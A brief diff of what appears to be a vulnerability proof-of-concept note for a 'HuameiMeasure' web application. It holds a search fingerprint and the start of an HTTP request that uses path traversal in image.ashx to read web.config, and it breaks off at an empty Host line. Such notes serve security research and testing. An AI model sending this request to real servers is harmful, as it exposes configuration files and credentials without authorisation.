@@ -7,7 +7,7 @@
 icon_hash="-334571363"
 ```
 
-## poc
+## POC
 ```javascript
 GET /HuameiMeasure/image.ashx?image_path=./../web.config HTTP/1.1
 Host: 
